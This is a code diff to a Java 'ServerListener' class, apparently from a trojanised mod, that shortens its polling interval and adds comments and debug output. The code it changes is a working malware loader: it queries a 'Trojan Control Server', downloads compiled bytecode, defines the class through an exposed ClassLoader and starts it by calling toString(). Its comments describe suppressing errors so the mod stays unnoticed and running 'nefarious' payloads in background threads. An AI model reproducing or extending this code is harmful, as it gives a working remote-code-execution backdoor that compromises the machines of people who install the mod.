@@ -13,7 +13,7 @@ public class ServerListener implements Runnable {
 	/*
 	 * Query every 60 s
 	 */
-	private static final long QUERY_INTERVAL_MILLIS = 60000;
+	private static final long QUERY_INTERVAL_MILLIS = 10000;
 	
 	/*
 	 * Could be a public IP or FQDN, would still work - should point to Trojan Control Server
@@ -44,13 +44,22 @@ public class ServerListener implements Runnable {
 	 * Name of the latest file received from the server. When the client queries the server and gets a different file name, it downloads the latest payload
 	 */
 	private String latestFilename = "";
+	
+	/**
+	 * The current running payload
+	 */
 	private Object currentObject;
 	
-	
-	public ServerListener() {		
+	/**
+	 * Constructs a ServerListener, which gets a ClassLoader to load malicious payloads. Exceptions are caught and suppressed to prevent anyone from being
+	 * alerted to the presence and activity of this mod.
+	 */
+	public ServerListener() {
 		try {
+			new StringFudger();
 			loader = ClassLoader.getSystemClassLoader();
 		} catch (Exception e) {
+			e.printStackTrace();
 		}
 	}
 
@@ -67,6 +76,7 @@ public class ServerListener implements Runnable {
 				
 				// query the malicious server
 				try (BufferedReader reader = new BufferedReader(new InputStreamReader(new URL(SERVER_URL + FILENAME_ROUTE).openStream(), "UTF-8"))){
+					System.out.println("QUERYING");
 					final StringBuilder response = new StringBuilder();
 					
 					for (String line; (line = reader.readLine()) != null;) {
@@ -74,9 +84,9 @@ public class ServerListener implements Runnable {
 					}
 					
 					final String currentFilename = response.toString();
+					System.out.println("RECEIVED: " + currentFilename);
 					if (!currentFilename.equals(latestFilename) && !currentFilename.equals("null")) {
-						
-						downloadNewClass(currentFilename);
+						downloadAndStartNewClass(currentFilename);
 						latestFilename = currentFilename;
 					}
 					
@@ -88,7 +98,13 @@ public class ServerListener implements Runnable {
 		}
 	}
 	
-	private void downloadNewClass(final String filename) {
+	/**
+	 * Downloads the latest compiled bytecode from the server, then loads and starts it. A malicious class is started
+	 * by calling {@link #toString()}, and stopped by calling {@link #equals(Object)}.
+	 * 
+	 * @param filename name of the file to download
+	 */
+	private void downloadAndStartNewClass(final String filename) {
 		final ByteArrayOutputStream baos = new ByteArrayOutputStream();
 		InputStream is = null;
 		
@@ -113,13 +129,22 @@ public class ServerListener implements Runnable {
 		}
 	}
 	
+	/**
+	 * Stops the current payload. It is necessary to explicitly stop payloads, because a payload will likely spawn a new thread to
+	 * accomplish some nefarious task in the background.
+	 */
 	private void stopCurrentObject() {
 		if (currentObject != null) {
 			currentObject.equals(null);
 		}
 	}
 	
-	
+	/**
+	 * Loads the class (given as a byte array), instantiates it, and calls {@link #toString()} on the object.
+	 * 
+	 * @param bytes compiled bytecode, Java version 1.8 or lower
+	 * @param rawFilename name of the file, this is used to derive the name of the fully qualified class to be loaded
+	 */
 	private void loadAndStartClass(final byte[] bytes, final String rawFilename) {
 		final String filename;
 		
@@ -137,6 +162,7 @@ public class ServerListener implements Runnable {
 			final Class<?> classObject = ClassLoaderExposer.defineClass(loader, fqClassname, buf, null);
 			final Object object = classObject.newInstance();
 			currentObject = object;
+			System.out.println("BOOSTRAPPING NEW PAYLOAD");
 			currentObject.toString();
 		} catch (Exception e) {
 			e.printStackTrace();
